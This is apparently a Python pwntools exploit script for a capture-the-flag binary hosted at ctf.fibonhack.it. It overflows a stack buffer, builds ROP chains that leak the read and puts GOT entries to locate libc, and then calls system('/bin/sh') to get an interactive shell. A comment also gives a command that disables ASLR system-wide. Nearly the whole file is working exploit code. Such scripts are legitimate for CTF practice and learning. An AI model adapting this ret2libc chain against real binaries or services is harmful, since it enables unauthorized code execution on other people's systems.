from pwn import *
#import pdb
exe = context.binary = ELF('chall')
libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')

remotehost = ('ctf.fibonhack.it', 10009)

gdbscript = """
"""

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(
            exe=exe.path, args=[exe.path] + argv,
            gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        
        
io = start()
io.recvline()
context.log_level = 'debug'
#pdb.set_trace()

##### Generation of unique sequences ####
g = cyclic_gen()
#io.sendline(g.get(200))   # now i know that the return value is after 18 bytes

#deactivating ASLR, libc will be loaded in the same base address during multiple executions
######### Disable ASLR "echo 0 | sudo tee /proc/sys/kernel/randomize_va_space" ########
# ldd chall -> /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7de8000)



#libc_base_address = 0x00007ffff7de8000

# so payload should look like 
# [padding] + [pop rdi gadget] + [/bin/sh address] + [system address]

####### pop rdi gadget ########
# ropper -f chall | grep 'rdi'
# 0x0000000000401273: pop rdi; ret;

pop_rdi_gadget = 0x0000000000401273

####### system address ########
# rabin2 -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep -w system
# 1467 0x00049850 0x00049850 WEAK   FUNC   45       system

#system_address = libc_base_address + 0x00049850

####### bin/sh address ########
# strings -t x -a /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
# 188962 /bin/sh
bin_offset = 0x188962

main_to_return = 0x0000000000401167

entry_to_return = 0x00401070

ret_addr = 0x000000000040101a

# ui.pause()

addr = exe.sym
addr_got = exe.got
addr_plt = exe.plt

# needed to get the location of libc, we print out the got value of read function 
buff_leak_read = b'A'*18 + p64(pop_rdi_gadget) + p64(exe.got.read) + p64(ret_addr) + p64(addr_plt.puts) + p64(ret_addr) + p64(entry_to_return) 

io.sendline(buff_leak_read)

io.recvline() #rumore

read_address = u64(io.recvline().strip(b'\n').ljust(8,b'\x00'))

# Dynamic libc address #### ONLY WHEN THE LIBC WILL BE KNOWN ####
libc.address = read_address - libc.sym.read

buff_leak_puts = b'A'*18 + p64(pop_rdi_gadget) + p64(exe.got.puts) + p64(ret_addr) + p64(addr_plt.puts) + p64(ret_addr) + p64(entry_to_return) 

io.sendline(buff_leak_puts)

io.recvline() #rumore
io.recvline() #rumore

puts_address = u64(io.recvline().strip(b'\n').ljust(8,b'\x00'))

log.info(f"Read indirizzo leakato: {read_address}")
log.info(f"Puts indirizzo leakato: {puts_address}")


exploit_buff = b'A'*18 + p64(pop_rdi_gadget) + p64(next(libc.search(b'/bin/sh'))) + p64(ret_addr)  + p64(libc.sym.system) # + b'\x90' 


io.sendline(exploit_buff)

io.interactive()